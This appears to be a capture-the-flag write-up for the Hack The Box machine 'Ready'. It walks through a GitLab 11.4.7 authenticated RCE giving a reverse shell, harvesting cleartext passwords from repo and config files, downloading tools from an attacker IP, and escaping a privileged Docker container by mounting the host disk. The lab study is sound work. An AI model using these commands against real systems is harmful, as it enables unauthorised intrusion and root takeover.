# Ready - Medium

```sh
sudo vim /etc/hosts
# add ready.htb

nmap -T4 -p- -A -Pn -v ready.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4
    * 5080/tcp - http - nginx

* ```nmap``` shows a 'robots.txt' is present with multiple entries, and shows the webpage is running 'Gitlab' and redirected to 'http://ready.htb:5080/users/sign_in'

* port 5080 is running an instance of GitLab Community Edition, and we have options to sign in as well as register a new account

* we can create a test account and sign into GitLab

* after signing in, we are redirected to the Projects view at 'http://ready.htb:5080/dashboard/projects' - we can explore for any clues

* checking available projects, there is only one project at 'http://ready.htb:5080/dude/ready-channel' - we can check this for any secrets

* the file structure indicates that this repo is for a webapp, and files like 'CHANGELOG.txt' mention 'Drupal 7.56', indicating that the repo could be for a blog page or a CMS

* checking the commit history at 'http://ready.htb:5080/dude/ready-channel/commits/master', we can see 4 commits were made - and these commits were later cancelled or failed

* as the repo contains a lot of data, we can check for secrets in CLI:

    ```sh
    # clone 'ready-channel' repo

    git clone http://ready.htb:5080/dude/ready-channel.git
    # this will ask for username-password

    cd ready-channel

    ls -la

    grep --color=auto -rnwiIe "PASSW\|PASSWD\|PASSWORD\|PWD" .
    # search for password strings
    ```

* the ```grep``` search gives several hits, but the main finding is in ```/sites/default/settings.php```, which gives the password '%%cHzhNC=k9yYN!T'

* checking this file shows that it is the MySQL DB password for user 'drupaluser'

* however, using this password to login via SSH as 'dude' or 'drupaluser' does not work, so we need to continue checking the files manually for any creds

* checking the Gitlab version at 'http://ready.htb:5080/help' shows that the instance is running GitLab version 11.4.7

* Googling for exploits associated with this version shows multiple authenticated RCE exploits

* we can attempt [one of these exploits](https://github.com/dotPY-hax/gitlab_RCE):

    ```sh
    nc -nvlp 42069
    # setup listener according to exploit

    python3 gitlab_rce.py http://ready.htb:5080 10.10.14.28
    # choose 0 for 11.4.7
    # this works and we get reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # user 'git'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # Enter twice

    pwd
    # /var/opt/gitlab/gitlab-rails/working

    ls -la /home
    # only one user 'dude'

    ls -la /home/dude
    # only user flag file is present

    cat /home/dude/user.txt
    # user flag

    ls -la /
    # we see '.dockerenv', indicating that this is a docker env
    # there is also another non-default file

    cat /root_pass
    ```

* the root directory includes a 'root_pass' file with the cleartext password 'YG65407Bjqvv9A0a8Tm_7w'

* we can attempt to do ```su root``` but this fails; we cannot switch to 'dude' user as well

* we can continue to check the Docker environment:

    ```sh
    hostname
    # 'gitlab.example.com'

    cat /proc/1/cgroup
    # includes 'docker' in the paths

    which ip
    # not found

    which ifconfig
    # not found

    hostname -i
    # IP is 172.19.0.2

    which ping
    # not available

    which curl
    # available

    curl http://host.docker.internal
    # cannot resolve this
    ```

* to check for other hosts in the same network, we can use ```nmap```:

    ```sh
    # fetch 'nmap' static binary, and copy of '/etc/services' from attacker

    cd /tmp

    wget http://10.10.14.28:8000/nmap

    wget http://10.10.14.28:8000/nmap-services

    chmod +x nmap

    ./nmap 172.19.0.0/24
    # scan network
    ```

* ```nmap``` finds host 172.19.0.1 with port 22 (SSH) open; this could be the main host which is running this instance as a Docker container for running GitLab

* we can try to SSH as 'root' on 172.19.0.1 using the password enumerated earlier but that does not work

* we can also run ```linpeas``` for enumeration on this box:

    ```sh
    wget http://10.10.14.28:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-40-generic
    * ```/proc``` & ```/dev``` mounted
    * lots of current capabilities highlighted - ```cap_dac_override```, ```cap_dac_read_search```, ```cap_net_admin```, ```cap_net_raw```, ```cap_sys_module```, ```cap_sys_rawio```, ```cap_sys_ptrace```, ```cap_sys_admin```, ```cap_syslog```
    * gitlab hashes dumped for 'admin' user - but the hash cannot be cracked

* checking [the exploit of certain capabilities in container escape](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_admin), we have an exploit for ```CAP_SYS_ADMIN```

* we can cross-refer this with [the docker breakout techniques](https://juggernaut-sec.com/docker-breakout-lpe/#Scenario_2_Getting_a_Foothold_Directly_in_a_Docker_Container) to attempt escaping the Docker container:

    ```sh
    fdisk -l
    # fdisk not found

    cat /proc/1/status | grep -i "seccomp"
    # this shows 'seccomp' 0 - which means it is a privileged container

    ls /dev
    # shows a lot more files - confirming it is a privileged container

    df -h
    ```

* ```df -h``` shows that ```/dev/sda2``` is mounted on ```/root_pass``` - this shows that ```sda2``` is the host drive

* we can try to mount it and access all of the host files from inside the Docker container, but to mount the drive we need root access

* we can continue manual enumeration:

    ```sh
    ls -la /

    sudo -l
    # sudo not available on box

    ls -la /opt
    # this contains 'backup' and 'gitlab' directory

    ls -la /opt/backup
    # contains a few files

    cd /opt/backup

    cat docker-compose.yml

    cat gitlab-secrets.json

    cat gitlab.rb
    ```

* we can check these files manually or use ```grep``` to search for password strings

* here, we get one more password string 'wW59U!ZKMbG9+*#h' from 'gitlab.rb'

* we can attempt to use this as the root password for the Docker container and it works:

    ```sh
    su root
    # this works

    id
    # root in docker container
    ```

* we can now attempt the Docker breakout method for escaping a privileged container:

    ```sh
    mkdir -p /mnt/test

    mount /dev/sda2 /mnt/test

    ls -la /mnt/test
    # accessing the root directory of the host filesystem

    # we can add a new root user into host '/etc/passwd' this way, but we can just read the flag

    cat /mnt/test/root/root.txt
    # root flag
    ```
